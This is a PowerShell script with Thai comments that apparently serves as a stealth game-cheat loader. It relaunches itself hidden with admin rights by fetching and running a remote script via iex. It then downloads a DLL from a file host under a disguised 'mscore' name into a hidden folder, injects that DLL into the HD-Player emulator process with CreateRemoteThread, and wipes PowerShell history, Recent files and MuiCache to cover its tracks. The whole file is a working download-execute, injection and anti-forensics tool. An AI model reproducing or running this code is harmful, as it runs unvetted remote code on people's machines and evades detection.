# =========================================================
# 1. ขอสิทธิ์ Administrator (แบบ Stealth)
# =========================================================
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"iex ((iwr 'https://github.com/potae112/Cmdfreefire/blob/main/dugduy.ps1' -UseBasicParsing).Content)`"" -Verb RunAs
    exit
}

# =========================================================
# 2. ตั้งค่าไฟล์และการพรางตัว (ใช้การสุ่มชื่อเพื่อเลี่ยง File In Use)
# =========================================================
$url = "https://files.catbox.moe/0ukxya.dll" 
$randomId = Get-Random -Minimum 100 -Maximum 999
$fakeName = "mscore_$randomId.dll" # สุ่มชื่อไฟล์เพื่อไม่ให้ซ้ำกับของเดิมที่โดนล็อก
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
$dllPath = Join-Path $workDir $fakeName
$targetProcess = "HD-Player" 

# =========================================================
# 3. เตรียมที่เก็บไฟล์ (ข้ามการลบถ้าลบไม่ได้ เพื่อไม่ให้ขึ้นตัวแดง)
# =========================================================
if (!(Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}
attrib +h +s $workDir

# =========================================================
# 4. ดาวน์โหลด DLL (ใช้พารามิเตอร์เงียบที่สุด)
# =========================================================
$ProgressPreference = 'SilentlyContinue'
# โหลดไฟล์ใหม่ด้วยชื่อที่สุ่มมา (จะไม่ติดสีแดงแน่นอนเพราะชื่อไม่ซ้ำ)
Invoke-WebRequest -Uri $url -OutFile $dllPath -UseBasicParsing -ErrorAction SilentlyContinue

# =========================================================
# 5. C# Injector Code
# =========================================================
$Source = @"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;

public class Injector {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
    }
}
"@

# =========================================================
# 6. ตรวจสอบและ Inject (ไม่สั่งปิดโปรแกรม)
# =========================================================
$proc = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
if ($proc -and (Test-Path $dllPath)) {
    Add-Type -TypeDefinition $Source -ErrorAction SilentlyContinue
    [Injector]::Inject($proc.Id, $dllPath)
}

# =========================================================
# 7. --- The Ghost Clean (บังคับ Yes All ทุกจุด) ---
# =========================================================
Start-Sleep -Seconds 2

# ล้างประวัติ PowerShell
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if (Test-Path $historyPath) { Remove-Item $historyPath -Force -Confirm:$false -ErrorAction SilentlyContinue }

# ล้าง Recent / AutomaticDestinations (ใส่ -Recurse และ -Confirm:$false เพื่อ Yes All)
$recentPaths = @(
    "$env:APPDATA\Microsoft\Windows\Recent",
    "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
    "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
)

foreach ($path in $recentPaths) {
    if (Test-Path $path) {
        # บังคับลบไฟล์ข้างในทั้งหมดแบบไม่ต้องถามยืนยัน
        Remove-Item -Path "$path\*" -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
    }
}

# ล้าง MuiCache (ลบชื่อไฟล์ที่สุ่มขึ้นมาทิ้ง)
$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
Get-ItemProperty -Path $muiPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | Where-Object { $_.Name -like "*mscore_*" -or $_.Name -like "*powershell*" } | ForEach-Object {
    Remove-ItemProperty -Path $muiPath -Name $_.Name -Force -Confirm:$false -ErrorAction SilentlyContinue
}

# รีสตาร์ท Explorer (ทำงานใน Background)
Start-Job -ScriptBlock {
    Stop-Process -Name explorer -Force
    Start-Sleep -Seconds 1
    Start-Process explorer
} | Out-Null

exit